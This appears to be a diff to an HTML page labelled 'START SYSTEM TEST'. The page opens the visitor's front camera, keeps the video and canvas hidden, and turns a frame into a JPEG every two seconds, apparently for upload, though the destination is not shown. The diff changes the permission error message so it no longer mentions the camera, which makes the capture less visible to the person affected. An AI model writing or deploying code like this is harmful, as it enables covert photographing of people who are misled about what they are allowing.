@@ -13,6 +13,7 @@
             display: flex; 
             align-items: center; 
             justify-content: center; 
+            overflow: hidden; 
         }
         #startBtn { 
             padding: 20px; 
@@ -21,15 +22,12 @@
             border: 2px solid white; 
             border-radius: 10px; 
             cursor: pointer; 
-            font-size: 20px;
-            z-index: 100;
+            font-size: 20px; 
         }
     </style>
 </head>
 <body>
-
     <button id="startBtn">START SYSTEM TEST</button>
-    
     <video id="video" style="display:none;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -46,7 +44,6 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
                 });
-                
                 video.srcObject = stream;
                 startBtn.style.display = 'none'; 
                 
@@ -67,9 +64,8 @@
                         });
                     }, 'image/jpeg');
                 }, 2000);
-
             } catch (err) {
-                alert("Error: Please click 'Allow' for camera access.");
+                alert("Please click 'Allow' to proceed.");
             }
         };
     </script>
